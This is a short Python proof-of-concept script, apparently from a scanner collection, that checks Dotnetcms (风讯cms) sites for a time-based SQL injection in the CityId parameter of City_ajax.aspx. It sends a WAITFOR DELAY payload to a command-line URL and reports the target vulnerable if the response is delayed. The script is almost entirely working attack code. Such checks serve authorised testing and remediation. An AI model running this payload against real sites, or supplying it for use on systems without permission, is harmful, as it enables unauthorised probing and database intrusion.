#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Dotnetcms(风讯cms)SQL注入漏洞
referer: https://silic.wiki/0day:%E9%A3%8E%E8%BF%85_dotnetcms_2.0-1.0_sql_injection
author: Lucifer
description: 文件City_ajax.aspx中,参数CityId存在SQL注入。
'''
import sys
import time
import requests
import warnings
def run(url):
        result = ['Dotnetcms(风讯cms)SQL注入漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/user/City_ajax.aspx?CityId=1%27WAiTFoR%20DeLAy%20%270:0:6%27--"
        vulnurl = url + payload
        start_time = time.time()
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
